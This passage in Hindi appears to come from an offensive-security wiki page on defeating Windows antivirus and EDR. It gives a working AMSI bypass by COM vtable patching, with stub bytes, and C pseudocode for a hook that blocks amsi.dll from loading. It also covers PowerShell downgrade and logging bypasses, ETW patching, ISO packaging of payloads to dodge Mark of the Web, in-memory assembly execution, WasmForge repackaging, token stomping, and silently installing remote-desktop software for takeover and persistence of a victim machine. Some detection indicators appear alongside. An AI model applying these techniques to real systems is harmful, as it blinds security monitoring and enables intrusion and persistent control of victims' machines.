एक अन्य process-local bypass, `AmsiScanBuffer` entry point को बिना छुए छोड़ देता है। रिपोर्ट किए गए 64-bit .NET loader में, CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` से एक AMSI COM object बनाया जाता है; `Marshal.GetIUnknownForObject()` से interface pointer मिलता है, और offset `0x18` पर मौजूद उसका vtable slot scan-call target के रूप में इस्तेमाल होता है। Loader, `Console.Clear()` के native pointer को एक छोटे x64 stub से patch करता है, `VirtualProtect()` के तहत उस vtable entry को stub पर सेट करता है, और फिर page protection को पहले वाली स्थिति में बहाल कर देता है। इसके लिए 64-bit pointer width और अपेक्षित COM layout, दोनों का होना ज़रूरी है; यह किसी भी AMSI interface या build के लिए कोई generic offset नहीं है। इससे पहले देखे गए stages हैं [signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) और [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml)।<sup>[[51]](#references)</sup>

देखे गए stub bytes हैं `41 C7 00 01 00 00 00 33 C0 C3`: वे `r8` में मौजूद result pointer पर **1** लिखते हैं और `eax` में **0** लौटाते हैं। इसलिए scan result के `AMSI_RESULT_CLEAN` (0) होने का रिपोर्ट किया गया दावा, `S_OK` return value और output enum को एक मान लेता है। दर्ज `AMSI_RESULT` क्रम में, result **1**, `AMSI_RESULT_NOT_DETECTED` है; यह अब भी detection threshold से नीचे है।<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll को load होने से रोककर AMSI block करना (LdrLoadDll hook)

AMSI तभी initialize होता है, जब current process में `amsi.dll` load हो जाता है। एक मज़बूत, language-agnostic bypass यह है कि `ntdll!LdrLoadDll` पर user-mode hook लगाया जाए, जो अनुरोधित module `amsi.dll` होने पर error लौटाता है। नतीजतन, उस process में AMSI कभी load नहीं होता और कोई scan नहीं होता।<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript और custom loaders—सभी में काम करता है (ऐसी किसी भी चीज़ में जो अन्यथा AMSI load करती)।
- लंबे command-line artefacts से बचने के लिए, scripts को stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) के ज़रिए feed करने के साथ इसका उपयोग करें।
- इसे LOLBins के ज़रिए execute किए गए loaders में इस्तेमाल होते देखा गया है (जैसे, `DllRegisterServer` को call करने वाला `regsvr32`)।

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** tool भी AMSI bypass करने के लिए script generate करता है।
**[https://amsibypass.com/](https://amsibypass.com/)** tool भी AMSI bypass करने के लिए script generate करता है। यह randomized user-defined function, variables और character expression का उपयोग करके signature से बचता है, और signature से बचने के लिए PowerShell keywords में random character casing लागू करता है।

**पहचाने गए signature को हटाएँ**

आप **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे tool का उपयोग करके, current process की memory से पहचाने गए AMSI signature को हटा सकते हैं। यह tool AMSI signature के लिए current process की memory को scan करता है और फिर उसे NOP instructions से overwrite कर देता है, जिससे वह प्रभावी रूप से memory से हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR products**

आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में AMSI का उपयोग करने वाले AV/EDR products की सूची पा सकते हैं।

**Powershell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:

```bash
powershell.exe -version 2
```

## PS लॉगिंग

PowerShell लॉगिंग एक ऐसी सुविधा है जो सिस्टम पर चलाए गए सभी PowerShell commands को लॉग करने देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन यह **उन attackers के लिए समस्या भी बन सकती है जो detection से बचना चाहते हैं**।

PowerShell लॉगिंग को bypass करने के लिए, आप ये techniques इस्तेमाल कर सकते हैं:

- **PowerShell Transcription और Module Logging को disable करें**: इस उद्देश्य के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का इस्तेमाल कर सकते हैं।
- **Powershell version 2 का इस्तेमाल करें**: अगर आप PowerShell version 2 का इस्तेमाल करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना चला सकते हैं। ऐसा करने के लिए: `powershell.exe -version 2`
- **एक unmanaged PowerShell session का इस्तेमाल करें**: `powershell.exe` launch किए बिना PowerShell host करने के लिए [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का इस्तेमाल करें (यह Cobalt Strike के `powerpick` में इस्तेमाल किया गया तरीका है)। इससे खास तौर पर `powershell.exe` process से जुड़े controls से बचा जा सकता है, लेकिन यह अपने आप AMSI, Script Block Logging या हर दूसरे PowerShell defense को disable नहीं करता; coverage runtime और host implementation पर निर्भर करती है।


## Obfuscation

> [!TIP]
> कई obfuscation techniques में data को encrypt किया जाता है, जिससे binary की entropy बढ़ जाती है और AVs तथा EDRs के लिए उसे detect करना आसान हो जाता है। इस पर सावधानी बरतें और शायद encryption केवल अपने code के उन खास sections पर लागू करें जो sensitive हैं या जिन्हें छिपाने की ज़रूरत है।

### ConfuserEx-Protected .NET Binaries को Deobfuscate करना

ConfuserEx 2 (या commercial forks) का इस्तेमाल करने वाले malware का analysis करते समय, protection की कई layers का सामना करना आम है, जो decompilers और sandboxes को रोक देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से **लगभग original IL को restore करता है**, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।<sup>[[10]](#references)</sup>

1.  Anti-tampering हटाना – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, ताकि कोई भी modification होने पर binary crash हो जाए। Encrypted metadata tables खोजने, XOR keys recover करने और एक साफ assembly को rewrite करने के लिए **AntiTamperKiller** का इस्तेमाल करें:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) शामिल हैं, जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) में दें।
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profile चुनें
     • de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names को restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और मुश्किल बनाने के लिए direct method calls को lightweight wrappers (जिन्हें *proxy calls* भी कहते हैं) से बदल देता है। इन्हें **ProxyCall-Remover** से हटाएँ:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   इस step के बाद आपको opaque wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API, जैसे `Convert.FromBase64String` या `AES.Create()`, दिखाई देने चाहिए।

4.  Manual clean-up – परिणामी binary को dnSpy में चलाएँ और बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को खोजें, ताकि *real* payload का पता लगाया जा सके। अक्सर malware इसे `<Module>.byte_0` के अंदर initialized TLV-encoded byte array के रूप में रखता है।

ऊपर दी गई chain, malicious sample चलाने की आवश्यकता के बिना, execution flow को restore करती है – offline workstation पर काम करते समय यह उपयोगी है।

> 🛈  ConfuserEx `ConfusedByAttribute` नाम का एक custom attribute बनाता है, जिसका उपयोग samples को अपने आप triage करने के लिए IOC के रूप में किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस project का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के ज़रिए software security को बेहतर बना सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि किसी external tool का उपयोग किए बिना और compiler को बदले बिना, compile time पर obfuscated code बनाने के लिए `C++11/14` भाषा का उपयोग कैसे किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework से तैयार की गई obfuscated operations की एक layer जोड़ें, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा मुश्किल हो जाए।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो कई तरह की PE files को obfuscate कर सकता है, जिनमें .exe, .dll और .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame मनमाने executables के लिए एक सरल metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) का उपयोग करने वाली LLVM-supported भाषाओं के लिए fine-grained code obfuscation framework है। ROPfuscator, सामान्य instructions को ROP chains में बदलकर assembly code स्तर पर program को obfuscate करता है, जिससे सामान्य control flow की हमारी सहज समझ बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim में लिखा गया .NET PE Crypter है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में बदलकर उन्हें load कर सकता है।

### LLVM compiler-assisted per-function self-masking

पूरे implant को सिर्फ़ उसके सोते समय mask करने के बजाय, संशोधित LLVM X86 backend चुने गए functions को निष्क्रिय रहने पर XOR-mask रख सकता है। Function Peekaboo PoC, `REG_` वाले demangled names चुनता है, अंतिम machine code के चारों ओर position-independent entry/exit stubs inject करता है, और `.text` में एक साझा masking handler emit करता है; source-level signatures और Windows x64 calling convention अपरिवर्तित रहते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

यह instruction selection और optimization के बाद होना चाहिए, क्योंकि transformation में **हर emitted return** शामिल होना चाहिए और x86 का सटीक layout पता होना चाहिए। एक pre-emission `MachineFunctionPass`, आख़िरी `MachineInstr::isReturn()` ढूँढ़ता है, उसे हटाता है ताकि अंतिम path appended epilogue में आगे बढ़े, और पहले के returns को `JMP_1 handler` से बदलता है। हर return से पहले compiler द्वारा generate किया गया stack/frame teardown बनाए रखें; केवल return instruction को redirect करें।<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` और `emitFunctionBodyEnd()` per-function stubs emit करते हैं, जबकि `emitEndOfAsmFile()` handler emit करता है। Emission stages के बीच साझा symbols, prologue branch को उसके बाद आने वाले epilogue पर target करने देते हैं; manually emitted near `je` के लिए, `0F 84` के बाद चार-byte MC expression `target - address_after_je` लिखें। Handler के लिए calls और jumps को `MCInst` objects (`CALL64pcrel32` और `JMP_1`) के रूप में emit किया जा सकता है। जब किसी unselected function में कोई बदलाव न किया गया हो, तो pass को `false` लौटाना चाहिए; PoC इस स्थिति में ग़लती से `true` लौटाता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata और pre-CRT initialization

PoC, `.funcmeta` में एक XOR key और 16-byte records रखता है, जिनमें loader-relocated function pointer और runtime length होते हैं। हालाँकि C field `uint32_t` है, handler record के offset `+8` पर QWORD access करता है, जो length और उसकी padding को पढ़ता है, और records के बीच `0x10` आगे बढ़ता है। PE section names केवल आठ bytes के होते हैं, इसलिए runtime lookup को `.funcmet` दिखता है। एक external patcher executable `.stub` जोड़ता है, stub में पुराने entry-point RVA को सहेजता है, और `AddressOfEntryPoint` को redirect करता है; PIC stub, `gs:[0x60]` → `[PEB+0x10]` से image base प्राप्त करता है, पहले से imported `VirtualProtect` को resolve करने के लिए PE32+ imports को traverse करता है, और CRT से पहले चलता है।<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` में sentinel set करता है और हर metadata function को call करता है। उसका हमेशा readable prologue, `gs:[0xF0]` में function start record करता है, sentinel का पता लगाता है और अभी-clear body को छोड़ देता है। इसके बाद epilogue `call handler` का उपयोग करता है; handler द्वारा 13 registers (`0x68` bytes) save करने के बाद, `[rsp+0x68]` पर return address transformed function का अंत होता है, इसलिए `end - start` को उसके metadata record में लिखा जा सकता है। सभी bodies को mask करने के बाद stub sentinel clear करता है और `ImageBase + original_entry_point_RVA` पर jump करता है।<sup>[[38]](#references)[[39]](#references)</sup>

सामान्य call के दौरान, prologue body को decode करने के लिए उसी symmetric handler को call करता है। अंतिम path appended epilogue में आगे बढ़ता है, जबकि हर पहले का return सीधे साझा handler पर jump करता है। सामान्य epilogue भी `call` के बजाय `jmp handler` का उपयोग करता है, ताकि re-masking के बाद handler का `ret`, original caller का return address consume करे और function result को `RAX` में सुरक्षित रखे।<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive और analysis indicators

Handler मौजूदा record ढूँढ़ता है, fixed visible prologue (`इस build में 0x46` bytes) को छोड़ता है, बाकी हिस्से की protection `PAGE_EXECUTE_READWRITE` में बदलता है, उसे byte-by-byte low key byte के साथ XOR करता है, और फिर protection को `PAGE_EXECUTE_READ` पर सेट करता है। इसलिए वही loop entry पर decode और हर सामान्य exit पर encode करता है।<sup>[[38]](#references)[[39]](#references)</sup>

इस design के high-signal indicators में शामिल हैं:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` के अंदर entry point और key के साथ relocated `.text` pointers रखने वाला `.funcmet` section;
- pre-CRT PEB, import-table और section-table parsing, जिसके बाद हर metadata pointer के ज़रिए calls;
- एक जैसे `call`/`pop` PIC prologues और कई return sites का एक handler पर redirect होना;
- `gs:[0xE8]`, `gs:[0xF0]` और `gs:[0xF8]` पर writes, जिनके बाद बार-बार `VirtualProtect` transitions और image-backed executable pages में bytewise XOR writes होती हैं।

यह memory-scanner evasion है, cryptographic protection नहीं: patched file में original clear body अब भी मौजूद रहती है, और debugger में `VirtualProtect` या XOR loop पर break करके active function dump किया जा सकता है। Single-byte XOR, readable metadata और fixed `0x46` boundary के कारण offline recovery भी आसान हो जाती है।<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC के TEB slots thread-local हैं, लेकिन modified code pages process-wide हैं। इसलिए concurrent या recursive entry के दौरान instructions फिर से toggle हो सकती हैं, जबकि कोई दूसरी invocation उन्हें execute कर रही हो; exceptions और nonlocal exits भी re-masking को bypass कर सकते हैं। एक robust implementation को transitions synchronize करने चाहिए, `lpflOldProtect` के ज़रिए लौटाई गई वास्तविक protection restore करनी चाहिए, hard-coded stub lengths से बचना चाहिए, x64 stack alignment के लिए `call` और `jmp` दोनों paths की जाँच करनी चाहिए, और executable bytes rewrite करने के बाद `FlushInstructionCache` call करना चाहिए। Microsoft स्पष्ट रूप से कहता है कि executable code modify होने पर instruction-cache coherency सुनिश्चित करने की ज़िम्मेदारी caller की है।<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen और MoTW

हो सकता है कि आपने इंटरनेट से कुछ executables download करके चलाते समय यह screen देखी हो।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach पर काम करता है। इसका मतलब है कि कम download की जाने वाली applications SmartScreen को trigger करेंगी, जिससे end user को alert किया जाएगा और file चलाने से रोका जाएगा (हालाँकि More Info -> Run anyway पर click करके file फिर भी चलाई जा सकती है)।

**MoTW** (Mark of The Web), `Zone.Identifier` नाम वाला एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जो इंटरनेट से files download करने पर अपने-आप बनता है और उसमें file के download source का URL भी होता है।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से download की गई file के लिए Zone.Identifier ADS की जाँच करना।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना ज़रूरी है कि **trusted** signing certificate से sign किए गए executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads को Mark of The Web से बचाने का एक बहुत प्रभावी तरीका उन्हें ISO जैसे किसी container में package करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **non-NTFS** volumes पर लागू **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक ऐसा tool है जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उदाहरण उपयोग:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

यह [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके payloads को ISO files में पैकेज कर SmartScreen को bypass करने का demo है।

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने देता है। हालाँकि, security products इसका उपयोग malicious activities को monitor और detect करने के लिए भी कर सकते हैं।

AMSI को disable (bypass) करने की तरह, user space process के **`EtwEventWrite`** function को बिना कोई event log किए तुरंत return कराने का तरीका भी संभव है। इसके लिए memory में function को patch करके उसे तुरंत return कराया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

इस बारे में अधिक जानकारी **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** पर मिल सकती है।<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries को memory में load करने का तरीका लंबे समय से जाना जाता है और AV की पकड़ में आए बिना अपने post-exploitation tools चलाने का यह अब भी एक बेहतरीन तरीका है।

चूँकि payload सीधे memory में load होगा और disk को नहीं छुएगा, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

ज़्यादातर C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की सुविधा देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process शुरू करना**, अपने post-exploitation malicious code को उस नए process में inject करना, उसे execute करना और काम पूरा होने पर नए process को kill करना शामिल है। इस तरीके के फायदे और नुकसान दोनों हैं। Fork and run तरीके का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका मतलब है कि अगर post-exploitation action के दौरान कुछ गलत हो जाए या पकड़ में आ जाए, तो हमारे **implant के बचने की संभावना काफी अधिक होती है।** इसका नुकसान यह है कि **Behavioural Detections** की पकड़ में आने की **संभावना अधिक होती है।**

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation malicious code को **अपने ही process में** inject किया जाता है। इस तरह, आप नया process बनाने और उसे AV से scan करवाने से बच सकते हैं। लेकिन इसका नुकसान यह है कि अगर payload execute करते समय कुछ गलत हो जाए, तो **अपना beacon खोने की संभावना काफी अधिक होती है**, क्योंकि वह crash हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> अगर आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) देखें।

आप **PowerShell से** C# Assemblies भी load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## NativeAOT WebAssembly repackaging of .NET tools (WasmForge)

सामान्य `execute-assembly` techniques में पहचानने योग्य MSIL बना रहता है और अंततः CLR initialize होता है। **WasmForge** इसके बजाय execution substrate को बदलता है: यह C# project को experimental NativeAOT-LLVM WASI target पर migrate करता है, उसे पहले से WebAssembly में compile करता है और उस module को Wazero-आधारित Windows PE host में embed करता है। परिणामी process को target के CLR, JIT या `dotnet` host की ज़रूरत नहीं होती, इसलिए केवल managed assembly names, CLR loading, AMSI या .NET ETW पर आधारित rules की सीधी दृश्यता नहीं रहती। यह evasion/packaging technique है, privilege boundary bypass नहीं—guest के पास मूल tool की permissions और OS पर दिखने वाला वही behavior रहता है।<sup>[[44]](#references)[[45]](#references)</sup>

### C# project बनाना

अनुशंसित build path project का Docker environment है, क्योंकि इसमें .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker और signing dependencies शामिल हैं। `.csproj` अपने-आप detect हो जाता है; one-shot build migration, compatibility patching, WASM compilation, PE forging और signing करता है।<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

समस्या निवारण या जनरेट किए गए कोड की समीक्षा के लिए, प्रक्रिया को `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, और अंत में `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` में बाँटें। बिल्ड इमेज `wasm-component-ld` wrapper का भी उपयोग करती है, ताकि WASI Preview 2 component encoding से बचा जा सके और embedded runtime द्वारा अपेक्षित plain module बनाया जा सके।<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# को x64 Win32 से जोड़ना

यह पारदर्शी recompile नहीं है। NativeAOT-WASI में Windows-उन्मुख BCL सुविधाएँ उपलब्ध नहीं हैं या वे बदल जाती हैं, और wasm32 guest सामान्यतः चार-बाइट pointer slots आवंटित करता है, जबकि x64 APIs आठ-बाइट pointers लौटा सकती हैं। WasmForge इन दोनों समस्याओं को निम्नलिखित generated layers से हल करता है:<sup>[[44]](#references)</sup>

1. एक source patcher AOT-विशिष्ट semantic differences को ठीक करता है और unsupported registry, pipes, WMI, identity, directory-service, file-version, LSA और इसी तरह की calls को `Wf*` helpers की ओर redirect करता है।
2. एक P/Invoke scanner NativeAOT `DirectPInvoke` mappings जनरेट करता है, ताकि `[DllImport]` calls guest के अंदर घोषित DLL को dynamically load करने के बजाय linked C bridge symbols से bind हों।
3. Host-bound pointers के लिए C# में `ulong` और C में `uint64_t` का उपयोग होता है। एक generic dispatcher call को host के Win32 handler तक पहुँचाता है; `out8_mask` वास्तविक आठ-बाइट output slots को चिह्नित करता है, जिनके upper halves को बनाए रखना ज़रूरी है। बिना चिह्न वाले wasm32-आकार के outputs में snapshot/restore protection का उपयोग होता है, ताकि x64 write पास के चार bytes को corrupt न कर सके।
4. Dedicated host bridges उन operations को संभालते हैं जो generic syscall dispatch में फिट नहीं होते, जैसे LSA ticket-cache access, structured results वाले Kerberos/BCrypt operations, TCP KDC traffic और LDAP queries।

उदाहरण के लिए, `version.dll!VerQueryValueW` का एक wrapper चार host addresses पास करता है और bits 2 और 3 (`0xC`) सेट करता है, क्योंकि value pointer और length आठ-बाइट output slots होते हैं। Wrapper स्वयं generic रहता है और DLL name, export name, arguments और mask को `wf_call_v2` तक पहुँचाता है; host pointer translation करके native API को invoke करता है।<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### सीमाएँ और detection pivots

Reflection-heavy code, dynamic assembly loading, arbitrary native callbacks, और WASM memory में लौटाई गई complex x64 structures के लिए अब भी हर tool के लिए patches की ज़रूरत पड़ सकती है या वे पूरी तरह fail हो सकते हैं। Generic WASI Preview 2 sockets भी no-op stubs तक पहुँच सकते हैं, इसलिए supported tools protocol-specific host shims का उपयोग करते हैं। Feature parity मान लेने के बजाय हर command को native build के विरुद्ध validate करें।<sup>[[44]](#references)[[45]](#references)</sup>

यह technique payload को invisible बनाने के बजाय telemetry को दूसरी जगह shift करती है। Detection का pivot ऐसे PE पर हो सकता है जिसमें WASM module मौजूद हो या materialize हो रहा हो, Wazero-जैसा runtime behavior, असामान्य host/guest memory allocation और copying, generic direct Win32 dispatch, signing और PE-resource anomalies, साथ ही resulting API calls और network traffic। इसलिए CLR-load, AMSI या .NET ETW events का न होना इस बात का प्रमाण नहीं मानना चाहिए कि process benign है।<sup>[[44]](#references)</sup>

## अन्य Programming Languages का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर install किए गए interpreter environment तक access देकर** अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर मौजूद Interpreter Binaries और environment तक access देने पर, आप compromised machine की **memory के भीतर इन languages में arbitrary code execute** कर सकते हैं।

Repo के अनुसार: Defender अब भी scripts scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने के लिए अधिक flexibility** होती है। इन languages में random, unobfuscated reverse shell scripts के साथ किए गए tests सफल रहे हैं।

## Static-analysis evasion के लिए WebAssembly re-hosting

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping किसी security product, जैसे EDR या AV, के access token में हेरफेर करता है। Token के privileges कम करने से process चलता रह सकता है, जबकि उसे privileged inspection या remediation actions करने से रोका जा सकता है।

इसे रोकने के लिए, Windows **बाहरी processes** को security processes के tokens के handles लेने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software का उपयोग

### Chrome Remote Desktop

[**इस ब्लॉग पोस्ट**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए अनुसार, victim के PC पर Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उस पर takeover करना और persistence बनाए रखना आसान है:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, फिर MSI file download करने के लिए Windows की MSI file पर click करें।
2. Victim पर installer को silently चलाएँ (admin आवश्यक है): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। Wizard आपसे authorize करने को कहेगा; आगे बढ़ने के लिए Authorize button पर click करें।
